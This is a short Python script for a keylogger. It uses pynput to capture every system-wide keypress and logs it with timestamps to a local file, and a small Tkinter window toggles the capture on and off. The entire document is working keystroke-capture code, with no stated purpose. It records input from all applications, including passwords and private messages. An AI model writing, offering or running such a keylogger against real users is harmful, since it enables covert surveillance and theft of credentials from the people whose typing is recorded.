import logging
import tkinter as tk
from pynput import keyboard
from threading import Thread

# Configure logging
log_file = "keylogs.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format="%(asctime)s - %(message)s")

# Global variable to control keylogging
keylogging_enabled = False

def toggle_keylogging():
    """Toggle keylogging on/off when button is clicked."""
    global keylogging_enabled
    keylogging_enabled = not keylogging_enabled
    status = "ON" if keylogging_enabled else "OFF"
    label_status.config(text=f"Keylogging: {status}", fg="green" if keylogging_enabled else "red")

def on_press(key):
    """Handle key presses and log them if keylogging is enabled."""
    global keylogging_enabled
    try:
        if keylogging_enabled:
            if key == keyboard.Key.space:
                logging.info(" ")
            elif key == keyboard.Key.enter:
                logging.info("\n")
            else:
                logging.info(str(key).replace("'", ""))
    except Exception as e:
        print(f"Error: {e}")

def start_keylogger():
    """Run keylogger in a separate thread."""
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# Start keylogger in the background
keylogger_thread = Thread(target=start_keylogger, daemon=True)
keylogger_thread.start()

# Create GUI using Tkinter
root = tk.Tk()
root.title("Keylogger Control")
root.geometry("300x150")

# Status Label
label_status = tk.Label(root, text="Keylogging: OFF", font=("Arial", 14), fg="red")
label_status.pack(pady=20)

# Toggle Button
toggle_button = tk.Button(root, text="Start Keylogging", font=("Arial", 12), command=toggle_keylogging)
toggle_button.pack()

# Run the Tkinter main loop
root.mainloop()
